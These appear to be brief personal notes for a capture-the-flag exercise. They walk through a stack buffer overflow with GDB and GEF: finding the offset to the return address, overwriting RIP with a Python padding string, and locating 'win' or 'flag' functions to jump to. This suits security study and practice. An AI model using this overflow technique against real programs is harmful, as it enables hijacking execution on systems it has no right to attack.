`source /usr/share/gef/gef.py`

- `pattern create`
- `r` (to run the program, run, start)
- `pattern offset $rsp`

  ```
  [+] Searching for '$rsp'

  [+] Found at offset 72 (little-endian search) likely

  [+] Found at offset 65 (big-endian search)
  ```

- try to override RIP

  - `python3 -c "print('A'*72 + 'B'*6)"`
    - note: use 6 \* 'B' instead of 8, because of canonical addresses

- `info functions .*flag.*`

  - `info functions .*win.*`
  - list functions, to find the address, filter with regex

- now override the RIP, if it doesn't work, try to move a couple instructions forward
